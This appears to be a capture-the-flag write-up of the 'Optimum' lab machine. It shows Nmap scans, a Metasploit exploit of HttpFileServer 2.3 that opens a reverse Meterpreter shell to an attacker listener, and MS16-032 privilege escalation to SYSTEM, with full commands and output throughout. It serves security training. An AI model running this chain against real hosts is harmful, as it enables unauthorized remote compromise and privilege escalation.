# Optimum

## Nmap

TCP Scanning

```

sudo nmap -sS -sC 10.10.10.8
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-05 10:39 EDT
Nmap scan report for 10.10.10.8
Host is up (0.51s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
|_http-title: HFS /

Nmap done: 1 IP address (1 host up) scanned in 58.64 seconds
```

UDP scanning

```

sudo nmap -sU 10.10.10.8
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-05 10:40 EDT
Nmap scan report for 10.10.10.8
Host is up (0.26s latency).
All 1000 scanned ports on 10.10.10.8 are open|filtered

Nmap done: 1 IP address (1 host up) scanned in 270.62 seconds
```

We got **HttpFileServer 2.3**  running on port 80

## Searchsploit

```

 searchsploit httpfileserver 2.3
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                              | windows/webapps/49125.py
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Metasploit

```
search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to lis
                                         ten on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.43.111   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.10.8
rhosts => 10.10.10.8
msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost 10.10.16.195
lhost => 10.10.16.195
msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 9003
lport => 9003
```

```

msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.16.195:9003 
[*] Using URL: http://0.0.0.0:8080/k22AEHnIgIkX
[*] Local IP: http://192.168.43.111:8080/k22AEHnIgIkX
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /k22AEHnIgIkX
[*] Sending stage (175174 bytes) to 10.10.10.8
[!] Tried to delete %TEMP%\pyPLnNC.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.16.195:9003 -> 10.10.10.8:49162) at 2021-07-05 10:44:49 -0400
[*] Server stopped.

meterpreter > dir
Listing: C:\Users\kostas\Desktop
================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2021-07-11 19:46:12 -0400  %TEMP%
100666/rw-rw-rw-  282     fil   2017-03-18 07:57:16 -0400  desktop.ini
100777/rwxrwxrwx  760320  fil   2014-02-16 06:58:52 -0500  hfs.exe
100444/r--r--r--  32      fil   2017-03-18 08:13:18 -0400  user.txt.txt


meterpreter > cat user.txt.txt
****************************meterpreter > pwd           < ----  ( user.txt )

C:\Users\kostas\Desktop
meterpreter > cd ../../..
meterpreter > dir
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2013-08-22 11:39:31 -0400  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2013-08-22 11:46:48 -0400  BOOTNXT
40777/rwxrwxrwx   0       dir   2013-08-22 10:48:41 -0400  Documents and Settings
40777/rwxrwxrwx   0       dir   2013-08-22 11:39:30 -0400  PerfLogs
40555/r-xr-xr-x   4096    dir   2013-08-22 09:36:16 -0400  Program Files
40777/rwxrwxrwx   4096    dir   2013-08-22 09:36:16 -0400  Program Files (x86)
40777/rwxrwxrwx   4096    dir   2013-08-22 09:36:16 -0400  ProgramData
40777/rwxrwxrwx   0       dir   2017-03-18 05:49:21 -0400  System Volume Information
40555/r-xr-xr-x   4096    dir   2013-08-22 09:36:16 -0400  Users
40777/rwxrwxrwx   24576   dir   2013-08-22 09:36:16 -0400  Windows
100444/r--r--r--  404250  fil   2013-08-22 11:46:48 -0400  bootmgr
0000/---------    0       fif   1969-12-31 19:00:00 -0500  pagefile.sys

meterpreter > cd Users/Administrator
[-] stdapi_fs_chdir: Operation failed: Access is denied.
```

we can use a metasploit module which suggest for exploit 

```

msf6 exploit(windows/local/always_install_elevated) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(windows/local/always_install_elevated) > use 0
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit

[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 37 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Post module execution completed
```
```

msf6 post(multi/recon/local_exploit_suggester) > search secondary logon

Matching Modules
================

   #  Name                                                           Disclosure Date  Rank    Check  Description
   -  ----                                                           ---------------  ----    -----  -----------
   0  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21       normal  Yes    MS16-032 Secondary Logon Handle Privilege Escalation


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/ms16_032_secondary_logon_handle_privesc

msf6 post(multi/recon/local_exploit_suggester) > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.43.111   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.16.195
lhost => 10.10.16.195
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit

[*] Started reverse TCP handler on 10.10.16.195:4444 
[+] Compressed size: 1016
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\NkebNRafAfIT.ps1...
[*] Compressing script contents...
[+] Compressed size: 3600
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2076

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 2088
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

qkbh9lmt8OUzV9Vwzx2BzL6wKnctlNwv
[+] Executed on target machine.
[*] Sending stage (175174 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.16.195:4444 -> 10.10.10.8:49164) at 2021-07-05 11:03:01 -0400
[+] Deleted C:\Users\kostas\AppData\Local\Temp\NkebNRafAfIT.ps1

C:\
meterpreter > cd Users/Administrator
meterpreter > cat root.txt.txt
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > cd Desktop
meterpreter > cat root.txt.txt
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > dir
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-18 07:52:56 -0400  desktop.ini
100444/r--r--r--  32    fil   2017-03-18 08:13:57 -0400  root.txt

meterpreter > cat root.txt
*******************************meterpreter > 
```
